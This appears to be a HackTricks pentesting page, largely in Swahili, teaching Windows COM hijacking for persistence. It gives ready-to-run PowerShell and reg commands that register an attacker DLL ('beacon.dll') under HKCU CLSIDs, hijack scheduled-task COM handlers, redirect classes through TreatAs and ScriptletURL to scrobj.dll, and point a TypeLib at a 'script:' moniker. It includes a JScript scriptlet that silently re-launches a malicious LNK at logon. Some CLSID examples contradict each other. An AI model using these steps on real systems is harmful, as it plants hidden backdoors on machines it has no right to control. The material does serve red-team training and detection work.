# COM Hijacking

{{#include ../../banners/hacktricks-training.md}}

### Kutafuta COM components zisizopo

Kwa kuwa thamani za HKCU zinaweza kurekebishwa na users, **COM Hijacking** inaweza kutumika kama **persistence mechanism**. Kwa kutumia `procmon`, ni rahisi kupata registry za COM zinazotafutwa lakini bado hazipo na zinaweza kuundwa na attacker. Filters za kawaida:

- Operesheni za **RegOpenKey**.
- ambapo _Result_ ni **NAME NOT FOUND**.
- na _Path_ inaishia na **InprocServer32**.

Variations muhimu wakati wa hunting:

- Pia tafuta keys za **`LocalServer32`** ambazo hazipo. Baadhi ya COM classes ni out-of-process servers na zitazindua EXE inayodhibitiwa na attacker badala ya DLL.
- Tafuta operesheni za registry za **`TreatAs`** na **`ScriptletURL`**, pamoja na `InprocServer32`. Detection content ya hivi karibuni na malware writeups zinaendelea kuvitaja kwa sababu ni nadra zaidi kuliko COM registrations za kawaida, hivyo huwa na signal ya juu.
- Nakili **`ThreadingModel`** halali kutoka kwenye `HKLM\Software\Classes\CLSID\{CLSID}\InprocServer32` unapoclone registration kwenye HKCU. Kutumia model isiyo sahihi mara nyingi huvuruga activation na kufanya hijack ionekane wazi.<sup>[[3]](#references)</sup>
- Kwenye systems za 64-bit, kagua views zote mbili za 64-bit na 32-bit (`procmon.exe` dhidi ya `procmon64.exe`, `HKLM\Software\Classes` na `HKLM\Software\Classes\WOW6432Node`) kwa sababu applications za 32-bit zinaweza kutatua COM registration tofauti.

Baada ya kuamua ni COM ipi isiyopo utakayo impersonate, tekeleza commands zifuatazo. _Kuwa mwangalifu ukiamua kuimpersonate COM inayoload kila baada ya sekunde chache, kwa sababu hilo linaweza kuwa kupita kiasi._
```bash
New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}"
New-Item -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" -Name "InprocServer32" -Value "C:\beacon.dll"
New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32" -Name "ThreadingModel" -Value "Both"
```
### COM components za Task Scheduler zinazoweza kutekwa

Windows Tasks hutumia Custom Triggers kuita COM objects na kwa kuwa zinatekelezwa kupitia Task Scheduler, ni rahisi zaidi kutabiri wakati zitakapoanzishwa.

<pre class="language-powershell"><code class="lang-powershell"># Show COM CLSIDs
$Tasks = Get-ScheduledTask

foreach ($Task in $Tasks)
{
if ($Task.Actions.ClassId -ne $null)
{
if ($Task.Triggers.Enabled -eq $true)
{
$usersSid = "S-1-5-32-545"
$usersGroup = Get-LocalGroup | Where-Object { $_.SID -eq $usersSid }

if ($Task.Principal.GroupId -eq $usersGroup)
{
Write-Host "Task Name: " $Task.TaskName
Write-Host "Task Path: " $Task.TaskPath
Write-Host "CLSID: " $Task.Actions.ClassId
Write-Host
}
}
}
}

# Sample Output:
<strong># Task Name:  Example
</strong># Task Path:  \Microsoft\Windows\Example\
# CLSID:  {1936ED8A-BD93-3213-E325-F38D112938E1}
# [more like the previous one...]</code></pre>

Ukikagua matokeo, unaweza kuchagua moja ambayo itatekelezwa **kila wakati mtumiaji anapoingia** kwa mfano.

Sasa ukitafuta CLSID **{1936ED8A-BD93-3213-E325-F38D112938EF}** katika **HKEY\CLASSES\ROOT\CLSID** na kwenye HKLM na HKCU, kwa kawaida utagundua kuwa thamani hiyo haipo kwenye HKCU.
```bash
# Exists in HKCR\CLSID\
Get-ChildItem -Path "Registry::HKCR\CLSID\{1936ED8A-BD93-3213-E325-F38D112938EF}"

Name           Property
----           --------
InprocServer32 (default)      : C:\Windows\system32\some.dll
ThreadingModel : Both

# Exists in HKLM
Get-Item -Path "HKLM:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}" | ft -AutoSize

Name                                   Property
----                                   --------
{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1} (default) : MsCtfMonitor task handler

# Doesn't exist in HKCU
PS C:\> Get-Item -Path "HKCU:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}"
Get-Item : Cannot find path 'HKCU:\Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}' because it does not exist.
```
Then, unaweza tu kuunda entry ya HKCU na kila wakati user anapoingia, backdoor yako itatekelezwa.

---

## COM TreatAs Hijacking + ScriptletURL

`TreatAs` huruhusu CLSID moja kuigwa na nyingine.<sup>[[4]](#references)</sup> Kwa mtazamo wa offensive, hii inamaanisha unaweza kuacha CLSID ya awali bila kuigusa, kuunda CLSID ya pili ya per-user inayoelekeza kwenye `scrobj.dll`, kisha kuelekeza COM object halisi kwenye ile yenye malicious kupitia `HKCU\Software\Classes\CLSID\{Victim}\TreatAs`.

Hii ni muhimu wakati:

- target application tayari inaunda CLSID thabiti wakati wa logon au app start
- unataka redirect ya registry-only badala ya kubadilisha `InprocServer32` ya awali
- unataka kutekeleza scriptlet ya ndani au ya remote `.sct` kupitia value ya `ScriptletURL`

Mfano wa workflow (uliorekebishwa kutoka public Atomic Red Team tradecraft na utafiti wa zamani kuhusu COM registry abuse):
```cmd
:: 1. Create a malicious per-user COM class backed by scrobj.dll
reg add "HKCU\Software\Classes\AtomicTest" /ve /t REG_SZ /d "AtomicTest" /f
reg add "HKCU\Software\Classes\AtomicTest\CLSID" /ve /t REG_SZ /d "{00000001-0000-0000-0000-0000FEEDACDC}" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}" /ve /t REG_SZ /d "AtomicTest" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32" /ve /t REG_SZ /d "C:\Windows\System32\scrobj.dll" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32" /v "ThreadingModel" /t REG_SZ /d "Apartment" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\ScriptletURL" /ve /t REG_SZ /d "file:///C:/ProgramData/atomic.sct" /f

:: 2. Redirect a high-frequency CLSID to the malicious class
reg add "HKCU\Software\Classes\CLSID\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}\TreatAs" /ve /t REG_SZ /d "{00000001-0000-0000-0000-0000FEEDACDC}" /f
```
Notes:

- `scrobj.dll` husoma thamani ya `ScriptletURL` na kutekeleza `.sct` iliyorejelewa, kwa hivyo unaweza kuhifadhi payload kama faili la ndani au kuipakua kwa mbali kupitia HTTP/HTTPS.
- `TreatAs` ni muhimu hasa wakati usajili wa awali wa COM umekamilika na ni thabiti katika HKLM, kwa sababu unahitaji tu redirect ndogo ya kila mtumiaji badala ya kuiga tree nzima.
- Kwa validation bila kusubiri trigger ya kawaida, unaweza kuanzisha fake ProgID/CLSID mwenyewe kwa `rundll32.exe -sta <ProgID-or-CLSID>` ikiwa target class inaunga mkono STA activation.

## COM TypeLib Hijacking (script: moniker persistence)

Type Libraries (TypeLib) hufafanua COM interfaces na hupakiwa kupitia `LoadTypeLib()`. COM server inapokuwa instantiated, OS inaweza pia kupakia TypeLib inayohusishwa nayo kwa kushauriana na registry keys zilizo chini ya `HKCR\TypeLib\{LIBID}`. Ikiwa njia ya TypeLib itabadilishwa kuwa **moniker**, kwa mfano `script:C:\...\evil.sct`, Windows itatekeleza scriptlet wakati TypeLib inapotatuliwa – hivyo kutoa persistence iliyofichika ambayo hu-trigger wakati components za kawaida zinapotumiwa.

Hili limeonekana likitumiwa dhidi ya Microsoft Web Browser control (ambayo hupakiwa mara kwa mara na Internet Explorer, apps zinazopachika WebBrowser, na hata `explorer.exe`).<sup>[[1]](#references)[[2]](#references)</sup>

### Steps (PowerShell)

1) Tambua TypeLib (LIBID) inayotumiwa na CLSID yenye frequency kubwa. Mfano wa CLSID unaotumiwa mara kwa mara na malware chains: `{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}` (Microsoft Web Browser).
```powershell
$clsid = '{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}'
$libid = (Get-ItemProperty -Path "Registry::HKCR\\CLSID\\$clsid\\TypeLib").'(default)'
$ver   = (Get-ChildItem "Registry::HKCR\\TypeLib\\$libid" | Select-Object -First 1).PSChildName
"CLSID=$clsid  LIBID=$libid  VER=$ver"
```
2) Elekeza njia ya TypeLib ya kila mtumiaji kwenye scriptlet ya ndani kwa kutumia moniker ya `script:` (hakuna haki za admin zinazohitajika):
```powershell
$dest = 'C:\\ProgramData\\Udate_Srv.sct'
New-Item -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Force | Out-Null
Set-ItemProperty -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Name '(default)' -Value "script:$dest"
```
3) Weka JScript `.sct` ndogo inayozindua upya payload yako kuu (k.m. `.lnk` inayotumiwa na chain ya mwanzo):
```xml
<?xml version="1.0"?>
<scriptlet>
<registration progid="UpdateSrv" classid="{F0001111-0000-0000-0000-0000F00D0001}" description="UpdateSrv"/>
<script language="JScript">
<![CDATA[
try {
var sh = new ActiveXObject('WScript.Shell');
// Re-launch the malicious LNK for persistence
var cmd = 'cmd.exe /K set X=1&"C:\\ProgramData\\NDA\\NDA.lnk"';
sh.Run(cmd, 0, false);
} catch(e) {}
]]>
</script>
</scriptlet>
```
4) Triggering – kufungua IE, application inayopachika WebBrowser control, au shughuli za kawaida za Explorer kutapakia TypeLib na kutekeleza scriptlet, hivyo kuandaa upya chain yako wakati wa logon/reboot.

Cleanup
```powershell
# Remove the per-user TypeLib hijack
Remove-Item -Recurse -Force "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver" 2>$null
# Delete the dropped scriptlet
Remove-Item -Force 'C:\\ProgramData\\Udate_Srv.sct' 2>$null
```
Maelezo
- Unaweza kutumia mantiki hiyo hiyo kwa vipengele vingine vya COM vinavyotumika mara kwa mara; kila mara pata `LIBID` halisi kwanza kutoka `HKCR\CLSID\{CLSID}\TypeLib`.
- Kwenye mifumo ya 64-bit unaweza pia kujaza subkey ya `win64` kwa consumers wa 64-bit.

## Marejeo

- [1] [Hijack the TypeLib – New COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [2] [Check Point Research – Kampeni ya ZipLine: Shambulio la Kisasa la Phishing Linalolenga Kampuni za Marekani](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [3] [Kukagua Upya COM Hijacking (SpecterOps)](https://specterops.io/blog/2025/05/28/revisiting-com-hijacking/)
- [4] [CLSID Key (Microsoft Learn)](https://learn.microsoft.com/en-us/windows/win32/com/clsid-key-hklm)

{{#include ../../banners/hacktricks-training.md}}
